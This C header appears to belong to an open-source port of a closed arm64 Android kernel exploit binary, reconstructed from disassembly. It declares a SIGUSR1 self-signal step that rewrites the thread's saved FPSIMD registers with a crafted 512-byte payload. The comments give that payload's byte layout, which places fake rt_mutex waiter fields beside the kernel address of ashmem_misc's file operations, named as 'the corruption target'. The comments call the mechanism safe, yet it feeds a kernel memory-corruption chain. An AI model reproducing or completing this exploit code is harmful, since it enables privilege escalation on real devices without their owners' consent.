#ifndef OSS_CLONE_SIGUSR1_PAYLOAD_H
#define OSS_CLONE_SIGUSR1_PAYLOAD_H

#include <stdint.h>

/* source: FUN_00103e18 (waiter thread), raw vaddr 0x3e64-0x3e98
 * (sigaction install) + 0x3fe4-0x40a8 (payload build, `e
 * asm.varsub=false` this session) + 0x40ac-0x40d4 (self tgkill) +
 * 0x3d6c-0x3e14 (the handler itself, separate function, confirmed NOT
 * to be fcn.00003d40 which merely precedes it with no gap -- that's an
 * unrelated atomic-swap helper). Full derivation in
 * docs/kernel-reference/README.md ("Major reframing: the real trigger
 * is a self-directed SIGUSR1" and its follow-ups).
 *
 * WHY this exists even though this project could not determine exactly
 * WHY the closed binary does it (two live hypotheses, neither
 * confirmed -- see the docs): every individual piece here is directly
 * observed in the disassembly, not invented, and the mechanism itself
 * (install a SIGUSR1 handler, self-signal, have the handler rewrite
 * its own pending signal frame's FPSIMD/vector register save area) is
 * INHERENTLY SAFE on its own -- it can only affect this thread's own
 * restored CPU vector-register state on return from the signal, never
 * kernel memory directly. Confirmed by reading the real kernel's
 * `arch/arm64/kernel/signal.c:parse_user_sigframe()`/
 * `restore_fpsimd_context()` (properly bounds-checked, no overflow).
 * So porting the OBSERVED mechanism faithfully and testing its real,
 * empirical effect on a real device (with a kprobe oracle watching
 * `ashmem_misc.fops` and dmesg/boot_id/uptime watched for any
 * instability) is a low-risk way to test the "maybe this signal
 * mechanism matters" hypothesis without guessing at what it does
 * internally. */

/* source: raw vaddr 0x3e64-0x3e98. Installs the SIGUSR1 handler
 * (SA_SIGINFO so the handler receives a ucontext_t*) that
 * sigusr1_wait_for_handler() below waits on. Must be called once,
 * before sigusr1_fire_and_wait(). Returns 1 on success, matching the
 * closed binary's own error-is-fatal convention for this step (its own
 * failure path calls fatal_usage()-equivalent). */
int sigusr1_install_handler(void);

/* source: raw vaddr 0x3fe4-0x40a8 (`e asm.varsub=false`, byte-exact).
 * Builds the 512-byte payload the handler will copy into the FPSIMD
 * vregs area, using this project's own already-verified page-relative
 * scratch addresses and real kernel addresses -- same inputs
 * fops_install.c's build_fops_install_object() already takes, not
 * anything new to derive:
 *   +0x18 = pi_parent            (page_base | 0x1180)
 *   +0x20 = ashmem_misc_fops_addr (real kernel address, the corruption
 *                                  target -- same value fops_install.c
 *                                  writes into the fake waiter's
 *                                  pi_tree_entry.rb_right)
 *   +0x28 = 0
 *   +0x30 = pi_waiters_self_ref   (page_base | 0x14e8)
 *   +0x38 = 0
 *   +0x40 = 0
 *   +0x48 = page_base | 0x2380   (DAT_0010d9c0 in the decompile --
 *                                  another page-relative scratch value,
 *                                  not previously named/used elsewhere
 *                                  in this project; ported as observed)
 *   +0x50 = waiter_lock           (page_base | 0x1390)
 *   +0x58 = 0x8200000000ULL       (literal constant observed in the
 *                                  disasm -- high 32 bits = 0x82,
 *                                  matching FAKE_WAITER_PRIO's real
 *                                  value 0x82 packed into a 64-bit
 *                                  field's upper half; low 32 bits = 0)
 *   +0x60 = 0
 *   +0x68 = 0
 * All other bytes (0x00-0x17, and 0x6c-0x1ff) are zero, matching the
 * closed binary's own leading `memset(buf, 0, 0x200)`. */
void sigusr1_build_payload(uint64_t page_base, uint64_t ashmem_misc_fops_addr);

/* source: raw vaddr 0x40ac-0x40d4 (getpid+gettid+tgkill) +
 * 0x40dc-0x4104 (cntvct_el0-based spin-wait for the handler's
 * completion flag, bounded iteration count matching the closed
 * binary's own ~0xc9ff*... loop shape -- ported as a real (not
 * infinite) bounded wait here too, returns instead of hanging forever
 * if the handler doesn't run in time). sigusr1_install_handler() and
 * sigusr1_build_payload() must both have been called first. Returns 1
 * if the handler ran and reported success, 0 otherwise (signal send
 * failed, or handler didn't complete within the bound, or handler
 * couldn't find the FPSIMD record). */
int sigusr1_fire_and_wait(void);

#endif
